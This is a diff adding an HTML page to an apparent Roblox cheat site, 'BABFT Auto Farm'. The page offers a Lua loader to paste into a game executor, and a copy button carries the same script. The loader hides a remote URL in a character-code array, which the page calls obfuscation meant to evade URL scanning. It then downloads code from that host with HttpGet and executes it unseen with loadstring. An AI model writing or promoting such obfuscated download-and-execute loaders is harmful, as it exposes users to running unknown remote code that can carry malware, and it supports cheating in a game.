@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>BABFT Auto Farm — Script</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><text y='32' font-size='32'>⚡</text></svg>">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<canvas id="starsCanvas" class="stars-canvas"></canvas>
+<div class="grid-bg"></div>
+<div class="orb orb-a"></div>
+<div class="orb orb-b"></div>
+
+<nav>
+  <div class="nav-inner">
+    <a href="index.html" class="nav-logo">BABFT<span>.</span>FARM</a>
+    <div class="nav-links">
+      <a href="index.html">Home</a>
+      <a href="script.html">Script</a>
+      <a href="features.html">Features</a>
+      <a href="guide.html">Guide</a>
+      <a href="faq.html">FAQ</a>
+      <a href="script.html" class="nav-cta">Get Script</a>
+    </div>
+  </div>
+</nav>
+
+<div class="page page-sm">
+
+  <div class="badge ani-1"><span class="bdot"></span> LATEST VERSION · LUA 5.1</div>
+  <h1 class="page-title ani-2">The Script</h1>
+  <p class="lead ani-3">Copy the script below and paste it directly into your Roblox executor. It auto-loads the latest version every time you run it.</p>
+
+  <div class="warn-box ani-3" style="margin-bottom:36px;">
+    <span class="warn-icon">⚠️</span>
+    <span>Use a trusted executor (Synapse X, KRNL, Fluxus, Arceus X, Delta). Never run scripts from sources you don't trust. Use at your own risk.</span>
+  </div>
+
+  <!-- Main script card -->
+  <div class="code-wrap ani-4" style="margin-bottom:20px;">
+    <div class="code-topbar">
+      <div class="dots-row"><div class="wd wr"></div><div class="wd wy"></div><div class="wd wg"></div></div>
+      <div class="code-title">autofarm_loader.lua</div>
+      <div class="code-lang">Lua 5.1</div>
+    </div>
+    <div class="code-body">
+      <pre><span class="cc">-- ╔══════════════════════════════════════════╗</span>
+<span class="cc">-- ║     BABFT AUTO FARM — Remote Loader      ║</span>
+<span class="cc">-- ║     Paste into executor → Execute        ║</span>
+<span class="cc">-- ╚══════════════════════════════════════════╝</span>
+
+<span class="ck">local</span> <span class="cv">chars</span> <span class="co">=</span> <span class="co">{</span>
+    <span class="cn">104</span><span class="co">,</span><span class="cn">116</span><span class="co">,</span><span class="cn">116</span><span class="co">,</span><span class="cn">112</span><span class="co">,</span><span class="cn">115</span><span class="co">,</span><span class="cn">58</span><span class="co">,</span><span class="cn">47</span><span class="co">,</span><span class="cn">47</span><span class="co">,</span>
+    <span class="cn">110</span><span class="co">,</span><span class="cn">117</span><span class="co">,</span><span class="cn">103</span><span class="co">,</span><span class="cn">101</span><span class="co">,</span><span class="cn">114</span><span class="co">,</span><span class="cn">103</span><span class="co">,</span><span class="cn">117</span><span class="co">,</span><span class="cn">121</span><span class="co">,</span>
+    <span class="cn">53</span><span class="co">,</span><span class="cn">48</span><span class="co">,</span><span class="cn">45</span><span class="co">,</span><span class="cn">97</span><span class="co">,</span><span class="cn">102</span><span class="co">,</span><span class="cn">107</span><span class="co">,</span><span class="cn">46</span><span class="co">,</span>
+    <span class="cn">103</span><span class="co">,</span><span class="cn">105</span><span class="co">,</span><span class="cn">116</span><span class="co">,</span><span class="cn">104</span><span class="co">,</span><span class="cn">117</span><span class="co">,</span><span class="cn">98</span><span class="co">,</span><span class="cn">46</span><span class="co">,</span><span class="cn">105</span><span class="co">,</span><span class="cn">111</span><span class="co">,</span>
+    <span class="cn">47</span><span class="co">,</span><span class="cn">110</span><span class="co">,</span><span class="cn">47</span>
+<span class="co">}</span>
+
+<span class="ck">local</span> <span class="cv">url</span> <span class="co">=</span> <span class="cs">""</span>
+<span class="ck">for</span> <span class="cv">_</span><span class="co">,</span> <span class="cv">v</span> <span class="ck">in</span> <span class="cf">ipairs</span><span class="co">(</span><span class="cv">chars</span><span class="co">)</span> <span class="ck">do</span>
+    <span class="cv">url</span> <span class="co">=</span> <span class="cv">url</span> <span class="co">..</span> <span class="cf">string.char</span><span class="co">(</span><span class="cv">v</span><span class="co">)</span>
+<span class="ck">end</span>
+
+<span class="cf">loadstring</span><span class="co">(</span><span class="cv">game</span><span class="co">:</span><span class="cf">HttpGet</span><span class="co">(</span><span class="cv">url</span><span class="co">))()</span></pre>
+    </div>
+    <div style="padding:14px 18px;border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;background:rgba(0,0,0,.2);">
+      <span style="font-size:.72rem;color:var(--muted);">Works with Synapse X · KRNL · Fluxus · Arceus X · Delta</span>
+      <button class="btn btn-primary" id="mainCopyBtn" onclick="handleCopy(event,this)">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+        <span>COPY SCRIPT</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- Copy counter row -->
+  <div style="display:flex;gap:12px;margin-bottom:48px;flex-wrap:wrap;" class="ani-4">
+    <div class="card" style="flex:1;min-width:140px;padding:16px 20px;display:flex;align-items:center;gap:14px;">
+      <span style="font-size:1.4rem;">📋</span>
+      <div><span style="font-family:'Orbitron',sans-serif;font-size:1.1rem;font-weight:700;color:var(--accent)" class="copy-counter">0</span><div style="font-size:.7rem;color:var(--muted);margin-top:2px;">Copies on this device</div></div>
+    </div>
+    <div class="card" style="flex:1;min-width:140px;padding:16px 20px;display:flex;align-items:center;gap:14px;">
+      <span style="font-size:1.4rem;">🔄</span>
+      <div><span style="font-family:'Orbitron',sans-serif;font-size:1.1rem;font-weight:700;color:var(--accent3)">LIVE</span><div style="font-size:.7rem;color:var(--muted);margin-top:2px;">Script status</div></div>
+    </div>
+    <div class="card" style="flex:1;min-width:140px;padding:16px 20px;display:flex;align-items:center;gap:14px;">
+      <span style="font-size:1.4rem;">📦</span>
+      <div><span style="font-family:'Orbitron',sans-serif;font-size:1.1rem;font-weight:700;color:var(--text)">v2.4.1</span><div style="font-size:.7rem;color:var(--muted);margin-top:2px;">Current version</div></div>
+    </div>
+  </div>
+
+  <!-- How it works -->
+  <h2 class="section-title ani-5">How the loader works</h2>
+  <div class="card ani-5" style="margin-bottom:16px;">
+    <p style="font-size:.88rem;color:var(--text2);line-height:1.75;">The script uses a character-code array to build a URL at runtime. This is a common obfuscation technique to prevent simple URL scanning. When executed, it fetches the actual farm script from a remote host via <code style="background:var(--surface2);padding:2px 7px;border-radius:5px;font-size:.8rem;color:var(--accent)">HttpGet</code> and runs it immediately using <code style="background:var(--surface2);padding:2px 7px;border-radius:5px;font-size:.8rem;color:var(--accent)">loadstring</code>. This means the core logic is always up-to-date without you needing to re-copy the script.</p>
+  </div>
+
+  <!-- What chars decode to -->
+  <div class="card ani-6" style="margin-bottom:48px;background:rgba(6,214,160,.04);border-color:rgba(6,214,160,.18);">
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+      <span style="font-size:1rem;">🔍</span>
+      <span style="font-size:.8rem;font-weight:600;color:var(--accent3);">DECODED URL</span>
+    </div>
+    <code style="font-size:.82rem;color:var(--text2);word-break:break-all;">https://nugerguy50-afk.github.io/n/</code>
+    <p style="font-size:.75rem;color:var(--muted);margin-top:8px;">This is where the main farm script lives. It's loaded fresh every time you run the loader.</p>
+  </div>
+
+  <div style="text-align:center;padding:16px 0;" class="ani-6">
+    <a href="guide.html" class="btn btn-secondary">Read the full setup guide →</a>
+  </div>
+
+</div>
+
+<footer>
+  <div>BABFT Auto Farm &nbsp;·&nbsp; <a href="faq.html">FAQ</a> &nbsp;·&nbsp; <a href="guide.html">Guide</a></div>
+  <div style="margin-top:6px;">For educational purposes only &nbsp;·&nbsp; Use at your own risk</div>
+</footer>
+
+<script src="shared.js"></script>
+<script>
+const SCRIPT = `local chars = {
+    104,116,116,112,115,58,47,47,
+    110,117,103,101,114,103,117,121,
+    53,48,45,97,102,107,46,
+    103,105,116,104,117,98,46,105,111,
+    47,110,47
+}
+
+local url = ""
+for _, v in ipairs(chars) do
+    url = url .. string.char(v)
+end
+
+loadstring(game:HttpGet(url))()`;
+
+function handleCopy(e, btn){
+  addRipple(btn, e);
+  copyText(SCRIPT, btn);
+}
+</script>
+</body>
+</html>
